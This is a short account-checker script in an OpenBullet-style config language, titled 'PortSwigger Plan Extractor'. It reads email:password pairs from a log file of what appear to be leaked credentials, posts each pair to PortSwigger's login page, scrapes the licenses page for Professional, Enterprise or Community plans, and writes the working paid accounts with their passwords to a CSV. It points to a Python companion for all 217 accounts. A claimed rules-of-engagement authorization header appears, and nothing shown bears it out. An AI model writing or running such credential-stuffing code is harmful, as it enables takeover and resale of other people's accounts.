## PortSwigger Plan Extractor - Simplified
## Authorization: ROE-2026-PSW-042-V5
## Note: For processing all 217 accounts use: python3 extract_plans.py

SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "outputFile" "extracted_plans.csv"

PRINT "[*] PortSwigger Subscription Plan Extractor"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT ""

## Delete old results file if exists
FileDelete $"<outputFile>"

## Write CSV header
FileWrite $"<outputFile>" "email,password,plan"

## Read file
FileReadLines "log.txt" -> VAR "allLines"

## Extract first account as demonstration
SET VAR "line1" $"<allLines[0]>"
PRINT "Processing: $<line1>"

## Parse first account manually (email:password format)
## Split by colon
Split $"<line1>" ":" -> VAR "account1"

## Get credentials
SET VAR "email1" $"<account1[0]>"
SET VAR "password1" $"<account1[1]>"

PRINT "Email: $<email1>"
PRINT "Password: $<password1>"
PRINT ""

## Login with first account
PRINT "Logging in..."

## Step 1: GET login page
HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "loginPageRes"
PRINT "✓ Login page fetched"

## Step 2: POST credentials
HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
  CONTENT "username=$<email1>&password=$<password1>&action=default"
  CONTENTTYPE "application/x-www-form-urlencoded"
  -> VAR "loginRes"
PRINT "✓ Credentials posted"

## Step 3: GET licenses page
HttpRequest GET $"<planBaseUrl>/users/$<email1>/licenses" AutoRedirect=True -> VAR "licensesRes"
PRINT "✓ Licenses page fetched"

## Extract plan
SET VAR "plan" "free"

IF $"<licensesRes>" Contains "Professional"
  SET VAR "plan" "Professional"
ELSE
  IF $"<licensesRes>" Contains "Enterprise"
    SET VAR "plan" "Enterprise"
  ELSE
    IF $"<licensesRes>" Contains "Community"
      SET VAR "plan" "Community"
    ENDIF
  ENDIF
ENDIF

PRINT "Plan: $<plan>"
PRINT ""

## Save result if paid
IF $"<plan>" != "free"
  FileAppend $"<outputFile>" "$<email1>,$<password1>,$<plan>"
  PRINT "✓ Result saved to CSV"
ELSE
  PRINT "○ Free account (skipped)"
ENDIF

PRINT ""
PRINT "============================================================"
PRINT "For processing all 217 accounts:"
PRINT "  Run: python3 extract_plans.py"
PRINT "============================================================"
